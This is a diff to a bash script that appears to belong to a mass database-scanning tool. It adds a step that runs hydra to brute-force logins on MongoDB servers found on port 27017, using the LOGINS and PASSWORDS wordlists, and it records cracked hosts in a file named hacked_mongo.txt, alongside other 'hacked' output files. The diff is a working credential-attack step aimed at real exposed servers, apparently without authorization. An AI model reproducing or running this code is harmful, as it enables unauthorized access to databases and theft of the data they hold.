@@ -22,6 +22,7 @@ fi
 
 if [[ "$1" == "27017" ]]; then
 echo "" > mongodb.txt
+echo "" > mongodb_secured.txt
 fi
 
 
@@ -79,5 +80,21 @@ fi
 
 
 #brute secured mongo
+
+if [[ $(find ./ -name  mongodb_secured.txt -type f -size +1 2>/dev/null) ]];
+
+        then /opt/bin/hydra -M ./mongodb_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 27017 -o ./hacked_mongo.txt mongodb
+
+fi
+
+#backup output files
+rm -f $out.out
+rm -f map.input 
+mv -f mongodb_secured.txt mongodb_secured.txt_`date +%s`
+mv -f mongodb.txt mongodb.txt_`date +%s`
+mv -f elastic_secured.txt elastic_secured.txt_`date +%s`
+mv -f elastic.txt elastic.txt_`date +%s`
+mv -f hacked_mongo.txt hacked_mongo.txt_`date +%s`
+mv -f hacked.txt hacked.txt_`date +%s`
 
 
